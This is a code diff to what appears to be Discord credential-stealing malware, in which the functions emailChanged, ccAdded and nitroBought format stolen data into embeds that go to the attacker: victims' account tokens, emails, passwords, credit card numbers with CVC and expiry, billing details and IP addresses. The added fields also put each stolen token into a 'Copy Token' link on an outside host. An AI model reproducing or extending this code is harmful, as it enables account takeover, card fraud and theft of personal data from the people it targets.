@@ -739,21 +739,36 @@ const emailChanged = async (email, password, token) => {
       {
         color: config.embed_color,
         fields: [
-          {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
+{
+                        name: `<a:rustler:987689940852817971> Token:`,
+                        value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+                        inline: false
+                    },
+                    {
+                        name: `<:rustler:987689933844127804> Badges:`,
+                        value: getBadges(json.flags),
+                        inline: true
+                    },
+                    {
+                        name: `<:rustler:987689935018549328> Nitro Type:`,
+                        value: await getNitro(json.premium_type, json.id, token),
+                        inline: true
+                    },
+                    {
+                        name: `<a:rustler:987689939401588827> Billing:`,
+                        value: billing,
+                        inline: true
+                    },
+                    {
+                        name: `<:rustler:987689943558135818> Email:`,
+                        value: `\`${json.email}\``,
+                        inline: true
+                    },
+                    {
+                        name: `<:rustler:987689942350196756> IP:`,
+                        value: `\`${ip}\``,
+                        inline: true
+                    },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
@@ -822,16 +837,36 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
             value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
+{
+                        name: `<a:rustler:987689940852817971> Token:`,
+                        value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+                        inline: false
+                    },
+                    {
+                        name: `<:rustler:987689933844127804> Badges:`,
+                        value: getBadges(json.flags),
+                        inline: true
+                    },
+                    {
+                        name: `<:rustler:987689935018549328> Nitro Type:`,
+                        value: await getNitro(json.premium_type, json.id, token),
+                        inline: true
+                    },
+                    {
+                        name: `<a:rustler:987689939401588827> Billing:`,
+                        value: billing,
+                        inline: true
+                    },
+                    {
+                        name: `<:rustler:987689943558135818> Email:`,
+                        value: `\`${json.email}\``,
+                        inline: true
+                    },
+                    {
+                        name: `<:rustler:987689942350196756> IP:`,
+                        value: `\`${ip}\``,
+                        inline: true
+                    },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
@@ -863,16 +898,36 @@ const nitroBought = async (token) => {
             value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
+{
+                        name: `<a:rustler:987689940852817971> Token:`,
+                        value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+                        inline: false
+                    },
+                    {
+                        name: `<:rustler:987689933844127804> Badges:`,
+                        value: getBadges(json.flags),
+                        inline: true
+                    },
+                    {
+                        name: `<:rustler:987689935018549328> Nitro Type:`,
+                        value: await getNitro(json.premium_type, json.id, token),
+                        inline: true
+                    },
+                    {
+                        name: `<a:rustler:987689939401588827> Billing:`,
+                        value: billing,
+                        inline: true
+                    },
+                    {
+                        name: `<:rustler:987689943558135818> Email:`,
+                        value: `\`${json.email}\``,
+                        inline: true
+                    },
+                    {
+                        name: `<:rustler:987689942350196756> IP:`,
+                        value: `\`${ip}\``,
+                        inline: true
+                    },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
